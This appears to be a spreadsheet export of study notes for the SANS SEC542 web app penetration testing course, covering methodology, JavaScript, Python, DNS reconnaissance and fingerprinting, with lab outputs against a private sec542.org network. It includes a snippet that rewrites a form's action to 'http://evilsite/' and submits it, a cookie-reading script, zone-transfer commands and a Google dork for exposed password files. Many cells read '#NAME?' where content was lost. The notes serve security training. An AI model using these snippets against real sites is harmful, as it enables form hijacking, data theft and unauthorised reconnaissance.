S542-1.5.23,SEC542,Presentation,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P124,,,,,,sec542/1.5/index.htm#s23,,,,
S542-1.5.32,SEC542,Exploitation (4/4),,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P133,,,,,,sec542/1.5/index.htm#s32,,,,
S542-1.5.33,SEC542,Cyclical Attack,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P134,,,,,,sec542/1.5/index.htm#s33,,,,
S542-1.5.34,SEC542,,,,,,,,1. Attacker's view,1.5 Methodology,,,,,,,sec542/1.5/index.htm#s34,,,,
S542-1.5.35,SEC542,Information Leakage Flaws,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P136,,,,,,sec542/1.5/index.htm#s35,,,,
S542-1.5.36,SEC542,Configuration Flaws,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P137,,,,,,sec542/1.5/index.htm#s36,,,,
S542-1.5.37,SEC542,Bypass Flaws,,,,,,"Bypassing Authentication, Authorization, File Control, Frond-End",1. Attacker's view,1.5 Methodology,B1P138,,,,,,sec542/1.5/index.htm#s37,,,,
S542-1.5.30,SEC542,Discovery (3/4),,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P131,,,,,,sec542/1.5/index.htm#s30,,,,
S542-1.6.01,SEC542,Javacript for Pen Testers: Section Objectives,,,,,,"Identify the major components of the Javascript scripting language and what the purpose of each component is, what is Javascript and how it is used in modern web applications, how statements, functions, and variables are used in Javascript, the purpose and typical uses of the Document Object Model, what a Javascript object is and how objects use properties and methods, what AJAX is and how it's used in modern web applications, what an XLMHttprequest object is and how it's used.",1. Attacker's view,1.6 JavaScript,B1P140,,,,,,sec542/1.6/index.htm#s1,,,,
S542-1.6.02,SEC542,Why JavaScript for Web App Testers,,,,,,#NAME?,1. Attacker's view,1.6 JavaScript,B1P141,,,,,,sec542/1.6/index.htm#s2,,,,
S542-1.5.25,SEC542,Web App Pen Test Methodology,,,,,,"- 4 steps: Recon, Mapping, Discovery, Exploitation
- Cycle through this process as often as possible, with the time you have",1. Attacker's view,1.5 Methodology,B1P126,,,,,,sec542/1.5/index.htm#s25,,,,
S542-1.5.31,SEC542,Typical Discovery Steps,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P132,,,,,,sec542/1.5/index.htm#s31,,,,
S542-1.6.04,SEC542,Javascript Use in Web Pages,,,,,,"- Can be inline within HTML as <script>�</script>
- As part of an HTML item <img � onload=""javascript:alert();"">
- Can be loaded from another doc <script src=http://�js>",1. Attacker's view,1.6 JavaScript,B1P143,,,,,,sec542/1.6/index.htm#s4,,,,
S542-1.5.38,SEC542,Injection Flaws,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P139,,,,,,sec542/1.5/index.htm#s38,,,,
S542-1.6.03,SEC542,JavaScript,,,,,,#NAME?,1. Attacker's view,1.6 JavaScript,B1P142,,,,,,sec542/1.6/index.htm#s3,,,,
S542-1.6.06,SEC542,,,,,,,,1. Attacker's view,1.6 JavaScript,,,,,,,sec542/1.6/index.htm#s6,,,,
S542-1.6.09,SEC542,JavaScript Variables,,,,,,"- Loosely typed. var x;
- Even when redeclaring a variable, the previous value will be kept",1. Attacker's view,1.6 JavaScript,B1P148,,,,,,sec542/1.6/index.htm#s9,,,,
S542-1.6.10,SEC542,JavaScript Functions,,,,,,#NAME?,1. Attacker's view,1.6 JavaScript,B1P149,,,,,,sec542/1.6/index.htm#s10,,,,
S542-1.6.05,SEC542,JavaScript Fundamentals,,,,,,"- Case sensitive, blocks as {}
- Single line comments // or multi-line /* */",1. Attacker's view,1.6 JavaScript,B1P144,,,,,,sec542/1.6/index.htm#s5,,,,
S542-1.6.07,SEC542,JavaScript Conditional Statements,,,,,,#NAME?,1. Attacker's view,1.6 JavaScript,B1P146,,,,,,sec542/1.6/index.htm#s7,,,,
S542-1.6.11,SEC542,JavaScript Events,,,,,,#NAME?,1. Attacker's view,1.6 JavaScript,B1P150,,,,,,sec542/1.6/index.htm#s11,,,,
S542-1.6.14,SEC542,,,,,,,,1. Attacker's view,1.6 JavaScript,,,,,,,sec542/1.6/index.htm#s14,,,,
S542-1.6.15,SEC542,Document Object Model,,,,,,"- Standard interface to the document 
- Allows script access to content, structure and style
- document.forms[0], document.write(), form.action,  form.submit() ",1. Attacker's view,1.6 JavaScript,B1P154,,,,,,sec542/1.6/index.htm#s15,,,,
S542-1.6.16,SEC542,DOM Nodes,,,,,,#NAME?,1. Attacker's view,1.6 JavaScript,B1P155,,,,,,sec542/1.6/index.htm#s16,,,,
S542-1.6.17,SEC542,JavaScript Object Methods and Properties,,,,,,"- Object-oriented: var myString = new String();
- Objects can be created
- object.property (attribute of the object): document.referrer
- window.alert()",1. Attacker's view,1.6 JavaScript,B1P156,,,,,,sec542/1.6/index.htm#s17,,,,
S542-1.6.08,SEC542,JavaScript Control Statements,,,,,,#NAME?,1. Attacker's view,1.6 JavaScript,B1P147,,,,,,sec542/1.6/index.htm#s8,,,,
S542-1.6.12,SEC542,Javascript Events in Attacks,,,,,,#NAME?,1. Attacker's view,1.6 JavaScript,B1P151,,,,,,sec542/1.6/index.htm#s12,,,,
S542-1.6.18,SEC542,Objects and Their Associated Properties & Methods,,,,,,"- Document: write(), referrer()
- Location: reload(),  port
- History: back(), length
- Array: join(), sort()",1. Attacker's view,1.6 JavaScript,B1P157,,,,,,sec542/1.6/index.htm#s18,,,,
S542-1.6.13,SEC542,Javascript Events in Attacks,,,,,,#NAME?,1. Attacker's view,1.6 JavaScript,B1P152,,,,,,sec542/1.6/index.htm#s13,,,,
S542-1.6.19,SEC542,Selecting and Changing Content,,,,,,"- Count the number of tags: document.getElementsByTagName(tag).length
- Determine URL of an image: document.images[""Logo""].src
- Rewrite form action and submit: 
  document.getElementById('myForm').action = ""http://evilsite/"";
  document.getElementById('myForm').submit();",1. Attacker's view,1.6 JavaScript,B1P158,,,,,,sec542/1.6/index.htm#s19,,,,
S542-1.6.20,SEC542,Interacting with Cookies,,,,,,"- Reading cookie: strCookie = document.cookie
- Parsing the cookie: document.cookie.split(';');  (see notes)
- Setting cookies: document.cookie = ""userid=kevin;expires=Fri, 10-Mar-2011;path=/"";",1. Attacker's view,1.6 JavaScript,B1P159,,,,,,sec542/1.6/index.htm#s20,,,,
S542-1.6.21,SEC542,,,,,,,,1. Attacker's view,1.6 JavaScript,,,,,,,sec542/1.6/index.htm#s21,,,,
S542-1.6.22,SEC542,Asynchronous JavaScript and XML,,,,,,"- Enabler for Web 2.0
- Javascript and XML for dynamic functions
- Refreshing just portions of a page",1. Attacker's view,1.6 JavaScript,B1P161,,,,,,sec542/1.6/index.htm#s22,,,,
S542-1.6.26,SEC542,XHR Flow Diagram,,,,,,-,1. Attacker's view,1.6 JavaScript,B1P165,,,,,,sec542/1.6/index.htm#s26,,,,
S542-1.6.27,SEC542,,,,,,,,1. Attacker's view,1.6 JavaScript,,,,,,,sec542/1.6/index.htm#s27,,,,
S542-1.6.28,SEC542,JavaScript Exercise: Goals,,,,,,#NAME?,1. Attacker's view,1.6 JavaScript,B1P167,,,,,,sec542/1.6/index.htm#s28,,,,
S542-1.6.29,SEC542,JavaScript Exercise:  Attack Usage,,,,,,#NAME?,1. Attacker's view,1.6 JavaScript,B1P168,,,,,,sec542/1.6/index.htm#s29,,,,
S542-1.6.30,SEC542,JavaScript Exercise: Open Files,,,,,,-,1. Attacker's view,1.6 JavaScript,B1P169,,,,,,sec542/1.6/index.htm#s30,,,,
S542-1.6.31,SEC542,JavaScript Exercise: Add Script Blocks,,,,,,-,1. Attacker's view,1.6 JavaScript,B1P170,,,,,,sec542/1.6/index.htm#s31,,,,
S542-1.6.32,SEC542,JavaScript Exercise: Change the Form,,,,,,-,1. Attacker's view,1.6 JavaScript,B1P171,,,,,,sec542/1.6/index.htm#s32,,,,
S542-1.6.33,SEC542,JavaScript Exercise: Create a Cookie,,,,,,"- createCookie(){  document.cookie=""userid=kevin;expires=Fri,10-Sep-2012;path=/""; }
- onload=createCookie()
- onmouseover=""alert(document.cookie);""",1. Attacker's view,1.6 JavaScript,B1P172,,,,,,sec542/1.6/index.htm#s33,,,,
S542-1.6.34,SEC542,JavaScript Exercise: Results,,,,,,-,1. Attacker's view,1.6 JavaScript,B1P173,,,,,,sec542/1.6/index.htm#s34,,,,
S542-1.6.35,SEC542,,,,,,,,1. Attacker's view,1.6 JavaScript,,,,,,,sec542/1.6/index.htm#s35,,,,
S542-2.1.01,SEC542,Python: Section Objectives,,,,,,"Basics of the python scripting language at a high level as well as statements, block, structure, and basic flow control statements.",2. Recon & Mapping,2.1 Python,B2P01,,,,,,sec542/2.1/index.htm#s1,,,,
S542-2.1.02,SEC542,,,,,,,,2. Recon & Mapping,2.1 Python,,,,,,,sec542/2.1/index.htm#s2,,,,
S542-2.1.03,SEC542,,,,,,,,2. Recon & Mapping,2.1 Python,,,,,,,sec542/2.1/index.htm#s3,,,,
S542-2.1.04,SEC542,,,,,,,,2. Recon & Mapping,2.1 Python,,,,,,,sec542/2.1/index.htm#s4,,,,
S542-2.1.05,SEC542,Creating Custom Scripts for Pen Testing,,,,,,#NAME?,2. Recon & Mapping,2.1 Python,B2P05,,,,,,sec542/2.1/index.htm#s5,,,,
S542-2.1.06,SEC542,,,,,,,,2. Recon & Mapping,2.1 Python,,,,,,,sec542/2.1/index.htm#s6,,,,
S542-2.1.07,SEC542,Why Python?,,,,,,#NAME?,2. Recon & Mapping,2.1 Python,B2P07,,,,,,sec542/2.1/index.htm#s7,,,,
S542-2.1.08,SEC542,Python,,,,,,"- Usable for web apps and client programs
- Version 3.x breaks some of the 2.x functionality
- Class focuses on 2.x (2.8)",2. Recon & Mapping,2.1 Python,B2P08,,,,,,sec542/2.1/index.htm#s8,,,,
S542-1.6.23,SEC542,XMLHttpRequest,,,,,,"- xhr = new XMLHttpRequest();
- xhr.open(""GET"", ""http...""); // connection not created yet
- xhr.send();   // creates the connection and send
- xhr.onreadsteatechange = AJAXProcess  (specify which function to use)
- xhr.readyState; // sets the state of the request
- xhr.responseText // contains response",1. Attacker's view,1.6 JavaScript,B1P162,,,,,,sec542/1.6/index.htm#s23,,,,
S542-1.6.24,SEC542,readyState,,,,,,#NAME?,1. Attacker's view,1.6 JavaScript,B1P163,,,,,,sec542/1.6/index.htm#s24,,,,
S542-1.6.25,SEC542,Example us of XHR: Query Google using SOAP API,,,,,,-,1. Attacker's view,1.6 JavaScript,B1P164,,,,,,sec542/1.6/index.htm#s25,,,,
S542-2.1.09,SEC542,Fundamentals,,,,,,"- Variables: i=5; print i
- Array/lists: hosts = ['web', 'app', 'db']; 
                    for host in hosts: print host
- Hash/dict: h = {'web':'192.168.1.1', 'app':'192.168.1.2'}; print h['web']
- White spaces matter (no {} blocks)
- Single-line comments with #
- Multi-line comments with """""" or '''",2. Recon & Mapping,2.1 Python,B2P09,,,,,,sec542/2.1/index.htm#s9,,,,
S542-2.1.10,SEC542,Control Statements,,,,,,"- while i<=10:
- for i in [0,1,2,3,4]:     (or for i in range(4):)",2. Recon & Mapping,2.1 Python,B2P10,,,,,,sec542/2.1/index.htm#s10,,,,
S542-2.1.11,SEC542,Conditional Statements,,,,,,"- if condition:
- elif condition:
- else:",2. Recon & Mapping,2.1 Python,B2P11,,,,,,sec542/2.1/index.htm#s11,,,,
S542-2.1.12,SEC542,Functions,,,,,,#NAME?,2. Recon & Mapping,2.1 Python,B2P12,,,,,,sec542/2.1/index.htm#s12,,,,
S542-2.1.13,SEC542,Standard Library,,,,,,#NAME?,2. Recon & Mapping,2.1 Python,B2P13,,,,,,sec542/2.1/index.htm#s13,,,,
S542-2.1.14,SEC542,HTTP Requests Library,,,,,,#NAME?,2. Recon & Mapping,2.1 Python,B2P14,,,,,,sec542/2.1/index.htm#s14,,,,
S542-2.1.18,SEC542,Python Exercise: Create the Script,,,,,,- #!/usr/bin/python,2. Recon & Mapping,2.1 Python,B2P18,,,,,,sec542/2.1/index.htm#s18,,,,
S542-2.1.19,SEC542,Python Exercise: Add HTTP Request Functionality,,,,,,"conn = httplib.HTTPConnection(""www.sec542.org"")
conn.request('GET', url)
resp = conn.getresponse()",2. Recon & Mapping,2.1 Python,B2P19,,,,,,sec542/2.1/index.htm#s19,,,,
S542-2.1.20,SEC542,Python Exercise: Print Various Header Values,,,,,,#NAME?,2. Recon & Mapping,2.1 Python,B2P20,,,,,,sec542/2.1/index.htm#s20,,,,
S542-2.1.21,SEC542,Python Exercise: Iterate through Page IDs,,,,,,"while n<=100:
  conn=httplib.HTTPConnection(""www..."")
  url=""/�index.php?id=""+str(n)
  conn.request('GET', url)
  resp=conn.getrestponse()
  print resp.getheader(""Server"")�Date�Cookie
 � n+=1",2. Recon & Mapping,2.1 Python,B2P21,,,,,,sec542/2.1/index.htm#s21,,,,
S542-2.1.22,SEC542,Python Exercise: Write Results to File,,,,,,-,2. Recon & Mapping,2.1 Python,B2P22,,,,,,sec542/2.1/index.htm#s22,,,,
S542-2.1.23,SEC542,Recon: Section Objectives,,,,,,"Understand how to conduct reconnaissance using publicly availably information, the importance of recon, Whois, DNS - using nslookup, dig, host, and Firece, public sources of information, Google and Google Groups (directirves and search modifieers), automating Google Searches (tools) and Other Useful Open Source Info (press releases, job postings, newsgroups, mailing lists, social networks, etc...).",2. Recon & Mapping,2.1 Recon,B2P23,,,,,,sec542/2.1/index.htm#s23,,,,
S542-2.1.24,SEC542,Recon,,,,,,- Phase 1 of methodology,2. Recon & Mapping,2.1 Recon,B2P24,,,,,,sec542/2.1/index.htm#s24,,,,
S542-2.1.25,SEC542,Recon Example,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P25,,,,,,sec542/2.1/index.htm#s25,,,,
S542-2.1.26,SEC542,,,,,,,,2. Recon & Mapping,2.1 Recon,,,,,,,sec542/2.1/index.htm#s26,,,,
S542-2.1.27,SEC542,Target Selection: Defining the Test Scope,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P27,,,,,,sec542/2.1/index.htm#s27,,,,
S542-2.1.28,SEC542,Identifying Target Machines,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P28,,,,,,sec542/2.1/index.htm#s28,,,,
S542-2.1.30,SEC542,Whois Records,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P30,,,,,,sec542/2.1/index.htm#s30,,,,
S542-2.1.31,SEC542,Whois Output,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P31,,,,,,sec542/2.1/index.htm#s31,,,,
S542-2.1.32,SEC542,DNS,,,,,,- Check out the Dan Kaminsky's blackhat or defcon vids on DNS,2. Recon & Mapping,2.1 Recon,B2P32,,,,,,sec542/2.1/index.htm#s32,,,,
S542-2.1.33,SEC542,Nslookup,,,,,,"- Perform traceroute to find ISP. Try zone transfer on ISP DNS.
- nslookup [host] [DNS_Server]",2. Recon & Mapping,2.1 Recon,B2P33,,,,,,sec542/2.1/index.htm#s33,,,,
S542-2.1.34,SEC542,Dig,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P34,,,,,,sec542/2.1/index.htm#s34,,,,
S542-2.1.35,SEC542,Fierce Domain Scanner,,,,,,"- Perl script from Robert Hansen (RSnake) ha.ckers.org/fierce
- Queries system DNS servers to find target DNS servers
- Retrieves SOA records
- Guesses host names from wordlist
- Reverse lookup on next and previous 5 IP addresses
- Uses set of prefixes to find hosts (www2...)
- Lookup hosts in domain: fierce.pl -dns sec542.org 
- Scan IP range: fierce.pl -range 192.168.1.0-255 -dnsservers ns1.sec542.org ",2. Recon & Mapping,2.1 Recon,B2P36,,,,,,sec542/2.1/index.htm#s35,,,,
S542-2.1.36,SEC542,,,,,,,,2. Recon & Mapping,2.1 Recon,,,,,,,sec542/2.1/index.htm#s36,,,,
S542-2.1.15,SEC542,File Access,,,,,,"- infile = open('FILENAME', 'r')
- read, readline, readlines, write, close
- for line in infile:
    do action per line",2. Recon & Mapping,2.1 Python,B2P15,,,,,,sec542/2.1/index.htm#s15,,,,
S542-2.1.16,SEC542,,,,,,,,2. Recon & Mapping,2.1 Python,,,,,,,sec542/2.1/index.htm#s16,,,,
S542-2.1.17,SEC542,Python Exercise,,,,,,#NAME?,2. Recon & Mapping,2.1 Python,B2P17,,,,,,sec542/2.1/index.htm#s17,,,,
S542-2.1.37,SEC542,DNS Exercise (Harvesting),,,,,,-,2. Recon & Mapping,2.1 Recon,B2P38,,,,,,sec542/2.1/index.htm#s37,,,,
S542-2.1.38,SEC542,DNS Exercise: Nslookup,,,,,,,2. Recon & Mapping,2.1 Recon,B2P39,,,,,,sec542/2.1/index.htm#s38,,,,
S542-2.1.39,SEC542,DNS Exercise: Dig,,,,,,"- ?dig @ns1.sec542.org sec542.org
- ?dig @ns1.sec542.org sec542.org mx
- ?dig @ns1.sec542.org sec542.org axfr
- Q5: What names/IP of MX for sec542.org?  mail (192.168.1.23) & mail2 (.7)
- Q6: Name and IP for preferred mail exchanger? mail (prio 10) (< mail2:20)
?$ dig @ns1 sec542.org mx

; <<>> DiG 9.5.1-P2 <<>> @ns1 sec542.org mx
; (1 server found)
;; global options:  printcmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 15958
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 2, ADDITIONAL: 4

;; QUESTION SECTION:
;sec542.org.   IN MX

;; ANSWER SECTION:
sec542.org.  38400 IN MX 10 mail.sec542.org.
sec542.org.  38400 IN MX 20 mail2.sec542.org.

",2. Recon & Mapping,2.1 Recon,B2P41,,,,,,sec542/2.1/index.htm#s39,,,,
S542-2.1.40,SEC542,DNS Exercise: Host,,,,,,"- Q7: What result is interesting? List of hosts, name servers, aliases (cname)
?$ host -la sec542.org ns1.sec542.org
sec542.org.          SOA ns1.sec542.org. admin.sec542.org. (
   2010040101 ;serial (version)
   28800 ;refresh period (8 hours)
   3600 ;retry interval (1 hour)
   604800 ;expire time (1 week)
   38400 ;default ttl (10 hours, 40 minutes)
   )
sec542.org.          A 192.168.1.41
sec542.org.          NS ns1.sec542.org.
sec542.org.          NS ns2.sec542.org.
sec542.org.          MX 10 mail.sec542.org.
sec542.org.          MX 20 mail2.sec542.org.
bar.sec542.org.      A 192.168.1.18
bootcamp.sec542.org. CNAME www.sec542.org.
dbdev.sec542.org.    A 192.168.1.23
foo.sec542.org.      A 192.168.1.67
hr-web.sec542.org.   A 192.168.1.41
mail.sec542.org.     A 192.168.1.23
mail2.sec542.org.    A 192.168.1.7
ns1.sec542.org.      A 192.168.1.41
ns2.sec542.org.      A 192.168.1.23
webdev.sec542.org.   A 192.168.1.23
www.sec542.org.      A 192.168.1.41
sec542.org.          SOA ns1.sec542.org. admin.sec542.org. (
   2010040101 ;serial (version)
   28800 ;refresh period (8 hours)
   3600 ;retry interval (1 hour)
   604800 ;expire time (1 week)
   38400 ;default ttl (10 hours, 40 minutes)
   )",2. Recon & Mapping,2.1 Recon,B2P42,,,,,,sec542/2.1/index.htm#s40,,,,
S542-2.1.41,SEC542,DNS Exercise: Fierce,,,,,," '- Run commands:
     cd /usr/bin/samurai/fierce2
     fierce -dns sec542.org
     fierce -range 192.168.1.0-255 -dnsservers ns1.sec542.org
?
?samurai@samurai-sec542:/usr/bin/samurai/fierce2$ ./fierce -dns sec542.org
Fierce 2.0beta-r299 ( http://trac.assembla.com/fierce )

Starting Fierce Scan at Thu Mar  3 10:15:20 2011
Args:  -dns sec542.org
Scanning domain sec542.org at Thu Mar  3 10:15:20 2011 ...

Nameservers for sec542.org
    ns2.sec542.org   192.168.1.23    
    ns1.sec542.org   192.168.1.41    
ARIN lookup sec542
Trying Zone Transfer ... 
    ns2.sec542.org    Failed 
    ns1.sec542.org    Sucess! 
  sec542.org. 38400 IN SOA ns1.sec542.org. admin.sec542.org. (
     2010040101 ; Serial
     28800 ; Refresh
     3600 ; Retry
     604800 ; Expire
     38400 ) ; Minimum TTL
sec542.org. 38400 IN A 192.168.1.41
sec542.org. 38400 IN NS ns1.sec542.org.
sec542.org. 38400 IN NS ns2.sec542.org.
sec542.org. 38400 IN MX 10 mail.sec542.org.
sec542.org. 38400 IN MX 20 mail2.sec542.org.
bar.sec542.org. 38400 IN A 192.168.1.18
bootcamp.sec542.org. 38400 IN CNAME www.sec542.org.
dbdev.sec542.org. 38400 IN A 192.168.1.23
foo.sec542.org. 38400 IN A 192.168.1.67
hr-web.sec542.org. 38400 IN A 192.168.1.41
mail.sec542.org. 38400 IN A 192.168.1.23
mail2.sec542.org. 38400 IN A 192.168.1.7
ns1.sec542.org. 38400 IN A 192.168.1.41
ns2.sec542.org. 38400 IN A 192.168.1.23
webdev.sec542.org. 38400 IN A 192.168.1.23
www.sec542.org. 38400 IN A 192.168.1.41
 
 Testing for Wildcards ... 
Trying Prefix Bruteforce ... 
    192.168.1.23   mail.sec542.org
    192.168.1.7   mail2.sec542.org
    192.168.1.41   ns1.sec542.org
Looking for MX records ... 
    10 mail.sec542.org
    20 mail2.sec542.org
Performing Whois Lookups ... 
Performing Reverse Lookups ... 
    sec542.org   192.168.1.41
Finding Nearby IPs ... 
    192.168.1.7   mail2.sec542.org     7.1.168.192.in-addr.arpa
    192.168.1.18   bar.sec542.org     18.1.168.192.in-addr.arpa
Ending domain scan at Thu Mar  3 10:15:20 2011
Elapsed time 37 seconds
Ending Fierce Scan 

End Time: Thu Mar  3 10:15:57 2011
Total Elapsed Time: 37 seconds

?samurai@samurai-sec542:/usr/bin/samurai/fierce2$ ./fierce -range 192.168.1.0-255 -dnsservers 192.168.1.41
Fierce 2.0beta-r299 ( http://trac.assembla.com/fierce )

Starting Fierce Scan at Thu Mar  3 10:16:46 2011
Args:  -dnsservers 192.168.1.41 -range 192.168.1.0-255
Finding Nearby IPs ... 
    192.168.1.23   mail.sec542.org     23.1.168.192.in-addr.arpa
    192.168.1.41   www.sec542.org     41.1.168.192.in-addr.arpa
",2. Recon & Mapping,2.1 Recon,B2P43,,,,,,sec542/2.1/index.htm#s41,,,,
S542-2.1.45,SEC542,Search Engines,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P47,,,,,,sec542/2.1/index.htm#s45,,,,
S542-2.1.46,SEC542,Google Directives,,,,,,"- site:, inurl:, intitle:, link:, ext:",2. Recon & Mapping,2.1 Recon,B2P48,,,,,,sec542/2.1/index.htm#s46,,,,
S542-2.1.47,SEC542,Google Modifiers,,,,,,"- Double quotes
- - omits pages with specific strings
- + forces the inclusion 
- * as wildcard",2. Recon & Mapping,2.1 Recon,B2P49,,,,,,sec542/2.1/index.htm#s47,,,,
S542-2.1.48,SEC542,Google Groups,,,,,,"- groups.google.com
- Google Groups supports groups-specific directives
- author:EMAIL
- insubject:""SUBJECT""",2. Recon & Mapping,2.1 Recon,B2P50,,,,,,sec542/2.1/index.htm#s48,,,,
S542-2.1.49,SEC542,Google Hacking,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P51,,,,,,sec542/2.1/index.htm#s49,,,,
S542-2.1.50,SEC542,Automating Google Searches,,,,,,- Require Google API key (stopped issuing SOAP API keys in Dec. 2006),2. Recon & Mapping,2.1 Recon,B2P52,,,,,,sec542/2.1/index.htm#s50,,,,
S542-2.1.51,SEC542,SensePost's Aura,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P53,,,,,,sec542/2.1/index.htm#s51,,,,
S542-2.1.52,SEC542,SiteDigger,,,,,,"- From FoundStone/McAfee
- Built-in copy of GHDB or Foundstones Google hacks
- Need Aura w/o API key
- Works on Windows or Linux with Wine
- http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx (v3)",2. Recon & Mapping,2.1 Recon,B2P54,,,,,,sec542/2.1/index.htm#s52,,,,
S542-2.1.53,SEC542,Wikto,,,,,,"- Has Aura built-in
- Windows alternative to Nikto
- Vulnerability analysis, spidering with Google hacking, host enum
- www.sensepost.com/research/wikto/",2. Recon & Mapping,2.1 Recon,B2P55,,,,,,sec542/2.1/index.htm#s53,,,,
S542-2.1.54,SEC542,Goolag,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P56,,,,,,sec542/2.1/index.htm#s54,,,,
S542-2.1.55,SEC542,Google Shunning,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P57,,,,,,sec542/2.1/index.htm#s55,,,,
S542-2.1.56,SEC542,Google Alerts,,,,,,"Useful Google alerts during PenTesting to find new pages:
- site:sans.org
- site:sans.org intitle:Error Occurred While""
- site:sans.org ""Index of / +passwd",2. Recon & Mapping,2.1 Recon,B2P58,,,,,,sec542/2.1/index.htm#s56,,,,
S542-2.1.57,SEC542,Press Releases and Job Postings,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P59,,,,,,sec542/2.1/index.htm#s57,,,,
S542-2.1.58,SEC542,Newsgroups and Mailing Lists,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P60,,,,,,sec542/2.1/index.htm#s58,,,,
S542-2.1.59,SEC542,Social Networks,,,,,,-,2. Recon & Mapping,2.1 Recon,B2P61,,,,,,sec542/2.1/index.htm#s59,,,,
S542-2.1.60,SEC542,Automated Social Network Parsing,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P62,,,,,,sec542/2.1/index.htm#s60,,,,
S542-2.1.61,SEC542,Using the scripts,,,,,,"- gpscan.rb Microsoft
- usernameGen.py InGuardians 10",2. Recon & Mapping,2.1 Recon,B2P63,,,,,,sec542/2.1/index.htm#s61,,,,
S542-2.1.62,SEC542,Other Sites,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P64,,,,,,sec542/2.1/index.htm#s62,,,,
S542-2.1.43,SEC542,,,,,,,,2. Recon & Mapping,2.1 Recon,,,,,,,sec542/2.1/index.htm#s43,,,,
S542-2.1.42,SEC542,DNS Exercise: Answers,,,,,,-,2. Recon & Mapping,2.1 Recon,B2P44,,,,,,sec542/2.1/index.htm#s42,,,,
S542-2.1.44,SEC542,Open Source Information,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P46,,,,,,sec542/2.1/index.htm#s44,,,,
S542-2.1.63,SEC542,Maltego,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P65,,,,,,sec542/2.1/index.htm#s63,,,,
S542-2.1.64,SEC542,Maltego screenshot,,,,,,-,2. Recon & Mapping,2.1 Recon,B2P66,,,,,,sec542/2.1/index.htm#s64,,,,
S542-2.1.65,SEC542,Differences between  Maltego CE and Pro,,,,,,"- Nag screen, save/export disabled, limited zom, transforms on 1  entity�
- 75 transforms per day
- Throttles comms between client and server",2. Recon & Mapping,2.1 Recon,B2P67,,,,,,sec542/2.1/index.htm#s65,,,,
S542-2.2.01,SEC542,Mapping: Section Objectives,,,,,,"Understand portscanning, OS fingerprinting, Version Scanning , and banner grabbing, port scanning (nmap), OS versioning (nmap, p0f), determining server versions/banner grabbing (netcat, httpring, nmap), determining ssl support (openssl, THCSSLCheck, SSLDigger, identifying Virtual Hosting, identifying Load balancing (URL, timestamp analysis, lasts modified date, load balancer cookies, ssl differences, source differences), testing on load-balanced infrastructures, and Identifying Software Configuration.",2. Recon & Mapping,2.2 Mapping,B2P68,,,,,,sec542/2.2/index.htm#s1,,,,
S542-2.2.02,SEC542,Mapping Phase Components,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P69,,,,,,sec542/2.2/index.htm#s2,,,,
S542-2.2.04,SEC542,Nmap,,,,,,- 2nd generation OS fingerprinting,2. Recon & Mapping,2.2 Mapping,B2P71,,,,,,sec542/2.2/index.htm#s4,,,,
S542-2.2.05,SEC542,Nmap Example,,,,,,-,2. Recon & Mapping,2.2 Mapping,B2P72,,,,,,sec542/2.2/index.htm#s5,,,,
S542-2.2.03,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s3,,,,
S542-2.2.09,SEC542,Nmap,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P76,,,,,,sec542/2.2/index.htm#s9,,,,
S542-2.2.10,SEC542,Netcat to Grab Server String,,,,,,"- printf ""GET / HTTP/1.0\n\n"" | nc -v www.inguardians.com 80",2. Recon & Mapping,2.2 Mapping,B2P77,,,,,,sec542/2.2/index.htm#s10,,,,
S542-2.2.11,SEC542,Netcat Server Version,,,,,,-,2. Recon & Mapping,2.2 Mapping,B2P78,,,,,,sec542/2.2/index.htm#s11,,,,
S542-2.2.12,SEC542,HTTPrint,,,,,,"- Cross platform. GUI on Windows (or WINE)
- www.net-square.com/httprint/",2. Recon & Mapping,2.2 Mapping,B2P79,,,,,,sec542/2.2/index.htm#s12,,,,
S542-2.2.13,SEC542,Netcraft,,,,,,#NAME?,2. Recon & Mapping,2.2 Mapping,B2P80,,,,,,sec542/2.2/index.htm#s13,,,,
S542-2.2.14,SEC542,Netcraft Example,,,,,,-,2. Recon & Mapping,2.2 Mapping,B2P81,,,,,,sec542/2.2/index.htm#s14,,,,
S542-2.2.15,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s15,,,,
S542-2.2.16,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,,sec542/2.2/index.htm#s16,,,,
S542-2.2.17,SEC542,Web Server Fingerprinting Exercise: Netcat,,,,,,"- Q1: What info is received? Apache/PHP/OS/SSL versions, Date/Time
- Q2: With port 443, what's the response/error? 400 Bad Request (plain HTTP to SSL server)
?$ nc www.sec542.org 80
HEAD / HTTP/1.0

HTTP/1.1 200 OK
Date: Thu, 03 Mar 2011 19:28:13 GMT
Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g
